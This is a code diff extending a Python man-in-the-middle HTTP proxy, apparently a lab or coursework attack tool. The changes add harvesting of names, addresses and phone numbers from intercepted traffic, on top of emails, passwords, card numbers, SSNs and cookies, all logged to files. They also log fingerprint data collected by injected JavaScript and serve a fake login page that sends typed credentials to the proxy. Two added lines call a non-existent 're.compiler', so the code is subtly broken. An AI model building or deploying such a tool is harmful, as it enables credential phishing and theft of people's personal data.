@@ -2,14 +2,18 @@ import argparse
 import gzip
 import re
 import socket
+import concurrent.futures
+import threading
 import signal
 import sys
 import zlib
 import brotli
+import datetime
 from urllib.parse import urlparse
 from urllib.parse import unquote
 
 args = None
+file_lock = threading.Lock()
 
 
 # Get the command line arguments
@@ -56,6 +60,11 @@ def passive(data: str, url: str):
     email_pattern = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
     credit_card_pattern = re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b")
     ssn_pattern = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
+    name_pattern = re.compiler(r"\b[A-Z][a-z]+ [A-Z][a-z]+\b")
+    address_pattern = re.compile(
+        r"\b\d+\s[A-Z][a-zA-Z\s]+\b,?\s[A-Z]{2}\s\d{5}(-\d{4})?"
+    )
+    phone_pattern = re.compiler(r"\b(\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4}\b")
     cookie_pattern = re.compile(r"Cookie:\s?(.*)")
 
     # Search for matches
@@ -64,18 +73,31 @@ def passive(data: str, url: str):
     emails = get_info(email_pattern, search_lines)
     credit_cards = get_info(credit_card_pattern, search_lines)
     ssns = get_info(ssn_pattern, search_lines)
+    name_pattern = get_info(name_pattern, search_lines)
+    address_pattern = get_info(address_pattern, search_lines)
+    phone_pattern = get_info(phone_pattern, search_lines)
     cookies = get_info(cookie_pattern, search_lines)
 
     # Log information (append to file)
-    with open("info_1.txt", "a") as f:
-        f.write(f"URL: {url}\n")
-        f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
-        f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
-        f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
-        f.write(f"Credit Cards: {credit_cards}\n") if len(credit_cards) > 0 else None
-        f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
-        f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
-        f.write("\n")
+    with file_lock:
+        with open("info_1.txt", "a") as f:
+            f.write(f"URL: {url}\n")
+            f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
+            f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
+            f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
+            f.write(f"Credit Cards: {credit_cards}\n") if len(
+                credit_cards
+            ) > 0 else None
+            f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
+            f.write(f"Names: {name_pattern}\n") if len(name_pattern) > 0 else None
+            f.write(f"Addresses: {address_pattern}\n") if len(
+                address_pattern
+            ) > 0 else None
+            f.write(f"Phone Numbers: {phone_pattern}\n") if len(
+                phone_pattern
+            ) > 0 else None
+            f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
+            f.write("\n")
 
 
 # In addition to forwarding packets it should inject JS code that should perform fingerprinting on the cient
@@ -211,7 +233,7 @@ def get_query(req: str) -> dict[str, str]:
     query = {}
 
     url = unquote(req.split("\r\n")[0].split(" ")[1])
-    
+
     for param in urlparse(url).query.split("&"):
         key, value = param.split("=")
         query[key] = value
@@ -219,78 +241,190 @@ def get_query(req: str) -> dict[str, str]:
     return query
 
 
+def log_query(query: dict[str, str]):
+    with file_lock:
+        with open("info_2.txt", "a") as f:
+            f.write(f"Fingerprint:\n")
+
+            for key, value in query.items():
+                f.write(f"{key}: {value}\n")
+
+            f.write("\n")
+
+
+def get_fake_login() -> bytes:
+    global args
+
+    print("[*] Generating fake login page")
+
+    body = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Login Page</title>
+            <style>
+                body {{
+                    font-family: Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    background-color: #f2f2f2;
+                }}
+
+                .login-container {{
+                    background-color: white;
+                    padding: 20px;
+                    border-radius: 5px;
+                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                }}
+
+                .login-container h2 {{
+                    text-align: center;
+                }}
+
+                form {{
+                    display: flex;
+                    flex-direction: column;
+                }}
+
+                input[type="text"], input[type="password"] {{
+                    padding: 10px;
+                    margin: 10px 0;
+                    border: 1px solid #ddd;
+                    border-radius: 4px;
+                }}
+
+                button[type="submit"] {{
+                    padding: 10px;
+                    background-color: #007bff;
+                    color: white;
+                    border: none;
+                    border-radius: 4px;
+                    cursor: pointer;
+                }}
+
+                button[type="submit"]:hover {{
+                    background-color: #0056b3;
+                }}
+            </style>
+        </head>
+        <body>
+            <div class="login-container">
+                <h2>Login</h2>
+                <form action="http://{args.address}:{args.port}/login" method="post">
+                    <input type="text" name="username" placeholder="Username" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Login</button>
+                </form>
+            </div>
+        </body>
+        </html>
+        """.encode(
+        "utf-8"
+    )
+
+    utc_time = datetime.datetime.utcnow()
+
+    # Format the time in the RFC 1123 format (e.g., Mon, 23 Nov 2023 12:00:00 GMT)
+    format_gmt_time = utc_time.strftime("%a, %d %b %Y %H:%M:%S GMT")
+
+    headers = f"""
+        HTTP/1.1 200 OK
+        Date: {format_gmt_time}
+        Server: Apache/2.4.41 (Unix)
+        Content-Type: text/html; charset=UTF-8
+        Content-Length: {len(body)}
+        Connection: close""".strip().encode(
+        "utf-8"
+    )
+
+    return headers + b"\r\n\r\n" + body
+
+
 def handle_client(client_sock: socket, passive_mode: bool):
-    while True:
-        # Receive data from the client
-        client_data = get_data(client_sock)
+    try:
+        while True:
+            # Receive data from the client
+            client_data = get_data(client_sock)
 
-        if client_data == b"":  # The client closed the connection
-            break
+            if client_data == b"":  # The client closed the connection
+                break
 
-        request = client_data.decode("utf-8")
+            request = client_data.decode("utf-8")
 
-        print(f"[*] Received {len(client_data)} bytes from the client.")
+            print(f"[*] Received {len(client_data)} bytes from the client.")
 
-        # Get the URL from the request based on the host header
-        url = get_url(request)
+            # Get the URL from the request based on the host header
+            url = get_url(request)
 
-        if not url:
-            print("[!] No URL found, skipping...")
-            continue
-
-        if passive_mode:
-            passive(request, url)
-        else:
-            if url == f"{args.address}:{args.port}":
-                print("[*] Obtained data from the client")
-                
-                print(f"[*] Query {get_query(request)}")
-                # save those data in a file
-
-                client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
+            if not url:
+                print("[!] No URL found, skipping...")
                 continue
 
-        # Forward the request to the target server and fetch the response
-        target_server = get_server_port(url)
+            if passive_mode:
+                passive(request, url)
+            else:
+                if url == f"{args.address}:{args.port}":
+                    print("[*] Obtained data from the client")
 
-        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        proxy_socket.connect(target_server)
-        proxy_socket.sendall(client_data)
+                    log_query(get_query(request))
+                    # save those data in a file
 
-        # Receive the response from the target server
-        response_data = get_data(proxy_socket)
+                    client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
+                    continue
+                elif url == "example.com":
+                    print("[*] Redirecting to fake login page")
+                    res = get_fake_login()
+                    client_sock.sendall(res)
+                    break
 
-        print(f"[*] Received {len(response_data)} bytes from the server.")
+            # Forward the request to the target server and fetch the response
+            target_server = get_server_port(url)
 
-        # Split the response into headers and body
-        response_components = response_data.split(b"\r\n\r\n")
+            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            proxy_socket.connect(target_server)
+            proxy_socket.sendall(client_data)
 
-        headers = response_components[0].decode("utf-8")
+            # Receive the response from the target server
+            response_data = get_data(proxy_socket)
 
-        body, encoding = decode_body(headers, response_components[1])
+            print(f"[*] Received {len(response_data)} bytes from the server.")
 
-        if passive_mode:
-            passive(headers + "\r\n" + body, url)
-        else:
-            injected = encode_body(active(body), encoding)
+            # Split the response into headers and body
+            response_components = response_data.split(b"\r\n\r\n")
 
-            response_data = (
-                re.sub(
-                    r"Content-Length: \d+", f"Content-Length: {len(injected)}", headers
-                ).encode("utf-8")
-                + b"\r\n\r\n"
-                + injected
-            )
+            headers = response_components[0].decode("utf-8")
 
-        client_sock.sendall(response_data)
+            body, encoding = decode_body(headers, response_components[1])
+
+            if passive_mode:
+                passive(headers + "\r\n" + body, url)
+            else:
+                injected = encode_body(active(body), encoding)
+
+                response_data = (
+                    re.sub(
+                        r"Content-Length: \d+",
+                        f"Content-Length: {len(injected)}",
+                        headers,
+                    ).encode("utf-8")
+                    + b"\r\n\r\n"
+                    + injected
+                )
+
+            client_sock.sendall(response_data)
+
+    finally:
+        client_sock.close()
 
 
 def main():
     global args
 
     get_args()
-
-    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
 
     if args.mode:
         if args.mode == "passive" or args.mode == "active":
@@ -302,25 +436,27 @@ def main():
         print("[*] No mode provided, running in passive mode")
 
     # Create a socket for the proxy to listen on
-    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    listener.bind((args.address, int(args.port)))
-    listener.listen(10)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((args.address, int(args.port)))
+        listener.listen(10)
 
-    print(f"[*] Listening on {args.address}:{args.port}")
+        print(f"[*] Listening on {args.address}:{args.port}")
 
-    while True:
-        client_sock, addr = listener.accept()
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            signal.signal(
+                signal.SIGINT,
+                lambda s, f: executor.shutdown(wait=False) and sys.exit(0),
+            )
 
-        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
+            while True:
+                client_sock, addr = listener.accept()
 
-        # Handle only one client at a time
-        # Here's should go the passive or active function that will deal with the different modalities of the proxy
-        handle_client(client_sock, False if args.mode == "active" else True)
+                print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
 
-        # Close the client socket
-        client_sock.close()
-        print("[*] Connection closed.")
+                executor.submit(
+                    handle_client, client_sock, False if args.mode == "active" else True
+                )
 
 
 if __name__ == "__main__":
